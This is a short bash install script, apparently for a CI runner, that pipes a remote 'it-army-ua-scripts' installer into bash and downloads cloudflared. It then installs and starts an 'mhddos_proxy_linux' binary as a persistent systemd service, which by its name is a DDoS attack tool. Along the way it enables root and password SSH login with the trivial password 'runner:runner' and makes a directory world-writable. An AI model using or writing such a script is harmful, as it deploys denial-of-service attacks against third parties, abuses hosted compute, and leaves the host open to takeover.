#!/bin/bash
set -e

echo "[*] Enable SSH password login and root login"
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "runner:runner" | chpasswd
sudo systemctl restart ssh

echo "[*] Run install script"
curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s

echo "[*] Install tools"
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o /usr/local/bin/cloudflared
chmod +x /usr/local/bin/cloudflared

echo "[*] Prepare directories"
sudo mkdir -p /mnt/repo/test
sudo chmod 777 /mnt/repo/test
sudo mkdir -p /opt/itarmy/bin

echo "[*] Preparing config"
# 注意：这里不使用 sudo，避免 gh auth 失效
git clone https://github.com/pornnewbee/blue.git /mnt/repo/test

echo "[*] Install Preparing service and binary"
install -Dm644 /mnt/repo/test/itarmy/mhddos.service \
  /etc/systemd/system/mhddos.service

install -Dm755 /mnt/repo/test/itarmy/bin/mhddos_proxy_linux \
  /opt/itarmy/bin/mhddos_proxy_linux

echo "[*] Enable and start service"
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service

echo "[+] install.sh finished successfully"
